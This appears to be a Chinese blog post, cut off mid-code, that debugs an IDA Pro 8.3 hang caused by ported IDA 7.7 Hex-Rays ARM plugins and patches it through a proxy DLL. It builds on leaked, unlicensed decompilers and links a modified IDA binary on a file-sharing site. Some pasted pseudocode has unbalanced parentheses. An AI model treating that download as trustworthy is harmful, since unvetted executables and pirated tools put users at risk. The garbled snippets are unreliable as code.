        <content type="html"><![CDATA[<blockquote><p>本文最早上传于先知社区<a href="https://xz.aliyun.com/news/18144">IDA旧版本插件移植后卡死的研究及修复-先知社区 (aliyun.com)</a></p></blockquote><blockquote><p>修复后ida下载地址</p><p>通过网盘分享的文件：IDA_Pro_v8.3_Portable.7z<br>链接: <a href="https://pan.baidu.com/s/1AWm31qhGrJ1IK5wKPQwJUQ?pwd=ddos">https://pan.baidu.com/s/1AWm31qhGrJ1IK5wKPQwJUQ?pwd=ddos</a> 提取码: ddos</p><p>如还存在问题可以联系Q :3824970852 笔者抽空时可以研究修复一下</p></blockquote><p>近日在研究异构路由器漏洞时，笔者使用的IDA出现了反编译异构路由器卡死的问题，和身边是师傅们交流后发现，这种问题不在少数，这种工具类的问题严重影响了正常的工作，故进行研究。</p><p>​    出现问题的直接原因在于此前由于IDA 8.3及以后的<code>hexrays</code>并未泄露，无法使用过去IDA 7.7的插件进行反编译，一通操作下通过<code>ida_dll_shim</code>等项目对7.7的<code>hexrays</code>进行了移植。移植完成后虽然可以使用，但部分函数仍出现IDA反编译时出现卡死等情况，导致<code>vulfi</code>等一众扫描类的插件不能以预期状态运行。</p><p>​    不过功夫不负有心人，笔者在搜寻的过程中找到了一篇帖子 <a href="https://bbs.kanxue.com/thread-279733-1.htm">在新版IDA中使用旧版本反编译插件</a>，帖子提供了一种修复的方法，但帖子中提供的修复方法并非不详细，并且<strong>修复的方法并不合理</strong>，<strong>对正常逆向存在一定的影响</strong>，故笔者决定自己对这次异常进行研究，并给予修复方案。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>​    在研究开始时，我的第一反应是需要了解IDA是在什么函数的什么地方出现了卡死，毕竟只有跟踪到了出现异常的点，才能进一步研究。这里我选择了<code>xdbg</code>进行跟踪分析函数调用，来解答我的下面两个疑问：</p><ul><li>出现问题的函数是什么？</li><li>产生问题的原因是什么？</li></ul><p>​    根据异常出现在<code>arm32</code>位反编译的情况下，不难猜测出这个问题大概率出现在<code>hexarm.dll</code>这个链接库中，所以接下来的分析主要针对涉<code>hexarm.dll</code>调用的相关函数。为了找到卡死的点，我先写了一个<code>IDAPython</code>脚本，来依次反编译程序的所有函数，直至卡死为止。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompile_all_functions</span>():</span><br><span class="line">    functions = <span class="built_in">list</span>(idautils.Functions())</span><br><span class="line">    total = <span class="built_in">len</span>(functions)</span><br><span class="line">    <span class="keyword">for</span> i, func_ea <span class="keyword">in</span> <span class="built_in">enumerate</span>(functions):</span><br><span class="line">        func_name = idaapi.get_func_name(func_ea)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r进度: <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;total&#125;</span> | 当前函数: <span class="subst">&#123;func_name&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cfunc = idaapi.decompile(func_ea)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cfunc:</span><br><span class="line">                idc.generate_pseudo(func_ea)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n反编译失败 @ <span class="subst">&#123;func_name&#125;</span> (0x<span class="subst">&#123;func_ea:x&#125;</span>): <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decompile_all_functions()</span><br></pre></td></tr></table></figure><p>​    这里我使用的是一个16KB的小的ARM32文件，在正常情况下只需要不到几秒中的时间就会运行完毕，但发现即使经过长时间后程序仍然卡在在<code>sub_8DB0</code>这里，那么不必多是，此时就是想要的异常情况了。</p><p><img src="https://www.helloimg.com/i/2025/06/01/683bc92bab288.png" alt="image-20250529203002649-1748747986602-1.png"></p><p>​    接下来我使用xdbg来附加现在处于卡死状态的IDA，为了找出此时死循环运行的函数，我通过<code>alt+k</code>去查看目前函数的调用关系，来确定函数，下面是我捕获的函数调用关系（主线程）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">线程 ID       地址               返回到              返回自              大小  方    注释                                                                                                                                      </span><br><span class="line">13192 - 主线程                                                             </span><br><span class="line">            0000001794DF9408 00000000589D775B 00000000592B2861 30  用户模块 ida-orig.is_numop+191</span><br><span class="line">            0000001794DF9438 00000000589D5321 00000000589D775B 60  用户模块 hexarm_0.00000000589D775B</span><br><span class="line">            0000001794DF9498 00000000589E08EE 00000000589D5321 30  用户模块 hexarm_0.00000000589D5321</span><br><span class="line">            0000001794DF94C8 0000000058967AFE 00000000589E08EE 30  用户模块 hexarm_0.00000000589E08EE</span><br><span class="line">            0000001794DF94F8 0000000058967D78 0000000058967AFE 30  用户模块 hexarm_0.0000000058967AFE</span><br><span class="line">            0000001794DF9528 0000000058967C20 0000000058967D78 30  用户模块 hexarm_0.0000000058967D78</span><br><span class="line">            0000001794DF9558 0000000058967D78 0000000058967C20 30  用户模块 hexarm_0.0000000058967C20</span><br><span class="line">            0000001794DF9588 000000005896D1F1 0000000058967D78 30  用户模块 hexarm_0.0000000058967D78</span><br><span class="line">            0000001794DF95B8 0000000058967AFE 000000005896D1F1 30  用户模块 hexarm_0.000000005896D1F1</span><br><span class="line">            0000001794DF95E8 0000000058967D78 0000000058967AFE 30  用户模块 hexarm_0.0000000058967AFE</span><br><span class="line">            0000001794DF9618 0000000058967C5F 0000000058967D78 30  用户模块 hexarm_0.0000000058967D78</span><br><span class="line">            0000001794DF9648 0000000058967EA4 0000000058967C5F 70  用户模块 hexarm_0.0000000058967C5F</span><br><span class="line">            0000001794DF96B8 00000000589D0829 0000000058967EA4 C0  用户模块 hexarm_0.0000000058967EA4</span><br><span class="line">            0000001794DF9778 00000000589689B1 00000000589D0829 B0  用户模块 hexarm_0.00000000589D0829</span><br><span class="line">            0000001794DF9828 0000000058924226 00000000589689B1 220 用户模块 hexarm_0.00000000589689B1</span><br><span class="line">            0000001794DF9A48 00000000588555CC 0000000058924226 1C0 用户模块 hexarm_0.0000000058924226</span><br><span class="line">            0000001794DF9C08 0000000058854904 00000000588555CC 50  用户模块 hexarm_0.00000000588555CC</span><br><span class="line">            0000001794DF9C58 0000000058921295 0000000058854904 400 用户模块 hexarm_0.0000000058854904</span><br><span class="line">            0000001794DFA058 00007FFDACEB1646 0000000058921295 E0  用户模块 hexarm_0.0000000058921295</span><br><span class="line">            0000001794DFA138 00007FFD95A4DF8D 00007FFDACEB1646 30  用户模块 _ida_hexrays.00007FFDACEB1646</span><br></pre></td></tr></table></figure><p>​    通过栈帧的调用关系可以发现程序在不停止的运行<code>ida-orig.is_numop+191</code>函数，此函数是<code>ida.dll</code>中的API，7.7的插件这里出现了问题，且两个插件本在各自的版本都没有出现问题，移植后却出现卡死的问题，这里合理怀疑是IDA对这个API进行了部分改动，所以我特地去查看了其相关的信息。</p><p><img src="https://www.helloimg.com/i/2025/06/01/683bc925f1c8d.png" alt="image-20250529211942841-1748747986603-2.png"></p><p>​    根据hexray官网给出的信息，这个函数确实在7.x到8.x进行了内容的变动，并且这个函数的功能是判断转入的数是否为该进制表示方法数字。</p><p>​    对此，问题出现的原因就已经明确了，IDA再进行更新时有着API的变动，而可能时函数内部逻辑的改变使得结果的不同，导致陷入死循环，那么接下来就是这时候我选择先对IDA7.7和IDA8.4的<code>ida-orig.is_numop</code>进行对比分析。</p><h2 id="is-numop函数分析"><a href="#is-numop函数分析" class="headerlink" title="is_numop函数分析"></a>is_numop函数分析</h2><h3 id="7-7版本代码"><a href="#7-7版本代码" class="headerlink" title="7.7版本代码"></a>7.7版本代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">is_numop</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v2 = a2 &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = a1 &amp; <span class="number">0xF00000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (a1 &amp; <span class="number">0xF00000</span>) == <span class="number">0x200000</span> || v3 == <span class="number">0x700000</span> || v3 == <span class="number">0x600000</span> || v3 == <span class="number">0x100000</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = a1 &amp; <span class="number">0xF000000</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">0x2000000</span> || v4 == <span class="number">0x7000000</span> || v4 == <span class="number">0x6000000</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v4 == <span class="number">0x1000000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = a1 &amp; <span class="number">0xF00000</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">0x200000</span> || v6 == <span class="number">0x700000</span> || v6 == <span class="number">0x600000</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v6 == <span class="number">0x100000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-4版本代码"><a href="#8-4版本代码" class="headerlink" title="8.4版本代码"></a>8.4版本代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">is_numop</span><span class="params">(__int64 a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// r10</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// r10</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  __int64 v8; <span class="comment">// r10</span></span><br><span class="line">  __int64 v9; <span class="comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="comment">// r10</span></span><br><span class="line">  __int64 v11; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  v2 = a2 &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">0</span>i64;</span><br><span class="line">        v5 = <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">2</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">        v5 = <span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( (a1 &amp; v5) == v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>i64;</span><br><span class="line">        v7 = <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">7</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">        v7 = <span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( (a1 &amp; v7) == v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">0</span>i64;</span><br><span class="line">        v9 = <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">6</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">        v9 = <span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( (a1 &amp; v9) == v8 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">0</span>i64;</span><br><span class="line">        v11 = <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">1</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">        v11 = <span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v3 + (v3 &gt; <span class="number">1</span>) + <span class="number">5</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( (a1 &amp; v11) == v10 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)++v3 &gt;= <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> v2 &lt; <span class="number">8</span></span><br><span class="line">        &amp;&amp; ((a1 &amp; (<span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>)))) == <span class="number">2</span>i64 &lt;&lt; (<span class="number">4</span>*<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>))</span><br><span class="line">         || (a1 &amp; (<span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>)))) == <span class="number">7</span>i64 &lt;&lt; (<span class="number">4</span>*((<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>))</span><br><span class="line">         || (a1 &amp; (<span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>)))) == <span class="number">6</span>i64 &lt;&lt; (<span class="number">4</span>*<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>))</span><br><span class="line">         || (a1 &amp; (<span class="number">15</span>i64 &lt;&lt; (<span class="number">4</span> * ((<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>)))) == <span class="number">1</span>i64 &lt;&lt; (<span class="number">4</span>*((<span class="type">unsigned</span> __int8)v2 + (v2 &gt; <span class="number">1</span>) + <span class="number">5</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>   这里我们从复杂的8.4版本入手，抛开其他结构只观察函数逻辑本身的情况下，函数<code>is_numop</code>的作用是检查给定的64位整数<code>a1</code>中特定的四位字段是否匹配预定义的数值模式，具体取决于第二个参数<code>a2</code>的低四位值。</p><h3 id="关键逻辑分析："><a href="#关键逻辑分析：" class="headerlink" title="关键逻辑分析："></a>关键逻辑分析：</h3><blockquote><ul><li>**当<code>v2 == 15</code>**：遍历8组不同的四位字段，检查是否有任意一组匹配以下模式之一：<code>0x2</code>、<code>0x7</code>、<code>0x6</code>、<code>0x1</code>。</li><li>**当<code>v2 &lt; 8</code>**：直接检查<code>a1</code>中由<code>v2</code>指定的四位字段是否匹配上述模式。</li></ul><ol><li><p><strong>字段位置计算</strong>：</p><ul><li>每个四位字段的位置由公式 <code>4 * (v3 + (v3 &gt; 1) + 5)</code> 或 <code>4 * (v2 + (v2 &gt; 1) + 5)</code> 确定。</li><li>例如：<ul><li>若<code>v3 = 0</code>，字段位于第20-23位（<code>4 * (0 + 0 + 5) = 20</code>）。</li><li>若<code>v3 = 2</code>，字段位于第32-35位（<code>4 * (2 + 1 + 5) = 32</code>）。</li></ul></li></ul></li><li><p><strong>模式匹配</strong>：</p><ul><li><p>每个四位字段需要等于以下值之一（掩码为0xF左移后的结果）：</p><ul><li><code>0x2</code>（二进制<code>0010</code>）</li><li><code>0x7</code>（二进制<code>0111</code>）</li><li><code>0x6</code>（二进制<code>0110</code>）</li><li><code>0x1</code>（二进制<code>0001</code>）</li></ul></li></ul></li></ol></blockquote><p>​    而我们分析完复杂的8.4版本后，再看一眼7.7版本时，顿时感到7.7的函数眉清目秀的，这里就不详细分析它的逻辑了，只给出它俩的差异。</p><blockquote><table><thead><tr><th align="center">特性</th><th align="center">8.4</th><th align="center">7.7</th></tr></thead><tbody><tr><td align="center"><strong>参数类型</strong></td><td align="center"><code>__int64 a1</code> (64位)</td><td align="center"><code>int a1</code> (32位)</td></tr><tr><td align="center"><strong>位域覆盖范围</strong></td><td align="center">8个位域 (位20-23,24-27,32-35,36-39,…)</td><td align="center">仅2个位域 (位20-23, 24-27)</td></tr></tbody></table></blockquote><p>​    简单的理解来看新版的<code>is_numop</code>传入的参数<code>a1</code>是去判读64个bit的操作，而7.7版本及以前都是32个bit判断的简单逻辑，并且逻辑不完全相同。既然分析出了具体原因，接下来的就是对dll文件进行修复了。</p><h2 id="修复问题"><a href="#修复问题" class="headerlink" title="修复问题"></a>修复问题</h2><h3 id="修复思路"><a href="#修复思路" class="headerlink" title="修复思路"></a>修复思路</h3><p>   修复这个问题，也分为多个思路，而笔者并不采用先前文章中的修复方法（先前文章是通过使用<code>is_numop0</code>替换<code>is_numop</code>），因为新版<code>is_numop0</code>函数的本质逻辑是调用了<code>is_numop(a1,0)</code>，根据我们上方的分析来看，<code>is_numop0</code>对应的判断逻辑应该是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">is_numop0</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 &amp; <span class="number">0xF00000</span>) == <span class="number">0x200000</span></span><br><span class="line">      || (a1 &amp; <span class="number">0xF00000</span>) == <span class="number">0x700000</span></span><br><span class="line">      || (a1 &amp; <span class="number">0xF00000</span>) == <span class="number">0x600000</span></span><br><span class="line">      || (a1 &amp; <span class="number">0xF00000</span>) == <span class="number">0x100000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这样的情况下<code>is_numop0</code><strong>只会对20-23位进行操作，但正常情况下对24-27的判断就会失效，也就是当n传入的值不等于<code>0</code>或<code>0xf</code>时，进行的判断和原先的函数是不同的</strong>。为了不影响反编译的结果和程序的健壮性，我需要一个更靠谱的方法去修复。</p><p>​    最容易想到的方法是将老版本<code>is_numop</code>写入<code>hexarm.dll</code>并修改名称，并将原先的<code>is_numop</code>调用修改为新函数，不过这种方法在操作上稍显麻烦。第二种容易想到方法是根据函数的逻辑，对函数外的代码进行部分修改，使他进入函数是时满足条件切正确，但过少的空间使得第二种方法并不容易，甚至无法完成，第三种方法是则是通过dll劫持，将<code>is_numop</code>指向到新的函数。思考再三，为了追求稳定性，最终选择了第三种修复方法。</p><p>在修复之前，先缕一便当前IDA在执行反编译时链接库之间的依赖关系，下图是笔者修复前链接库的关系。</p><p><img src="https://www.helloimg.com/i/2025/06/01/683bc984cf190.png" alt="image-20250530144708554-1748747986603-3.png"></p><p>​    经过上图我们可以看到，我先前使用的项目<code>ida_dll_shim</code>本质上就是进行了一个dll的劫持来修复旧版本插件不识别的问题，但由于<code>is_numop</code>只是改变函数内容，如果将把<code>8.4dll</code>的<code>is_numop</code>直接修改为7.7的<code>is_numop</code>后，原先自带的<code>8.4hexrays-x86_64</code>则可能出现问题，为了不影响新插件的功能，故这个项目并没有对这种内容改变函数进行明确修改，最终导致这个问题。</p><p>​    再回头来考虑我们修复的实现方法，为解决这个问题我们可以通过在<code>ida.dll</code>中创建一个新的函数<code>is_num0p</code>来代替<code>is_numop</code>，并在老版本插件将新函数的替换原先的<code>is_num0p</code>。</p><p><img src="https://www.helloimg.com/i/2025/06/01/683bc931de775.png" alt="image-20250530205623078-1748747986603-4.png"></p><h3 id="修复操作"><a href="#修复操作" class="headerlink" title="修复操作"></a>修复操作</h3><p>首先我们要重新编译<code>ida_dll_shim</code>中的ida(这里建议大家先看一遍原先的项目文件，并跟着项目操作完，因为这里是在操作完一次项目操作后进行的，这里我默认大家已经跟着项目修复完第一次了，已经有<code>ida-orig</code>和<code>ida64-orig</code>文件),上文提到过，<code>ida_dll_shim</code>是通过dll劫持实现的，本质上是创建一个新<code>ida.dll</code>转发了<code>ida-orig</code>中的函数，并添加了新函数，这里我们在项目的<code>ida_dll_exports.h</code>中创建一个新的函数并放入老版ida的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下列代码添加到ida_dll_exports.h 末尾</span></span><br><span class="line">idaman <span class="type">int</span> ida_export <span class="title function_">is_num0p</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v2 = a2 &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = a1 &amp; <span class="number">0xF00000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (a1 &amp; <span class="number">0xF00000</span>) == <span class="number">6291456</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">switch</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2097152</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1048576</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7340032</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = a1 &amp; <span class="number">0xF000000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">100663296</span> || v6 == <span class="number">0x2000000</span> || v6 == <span 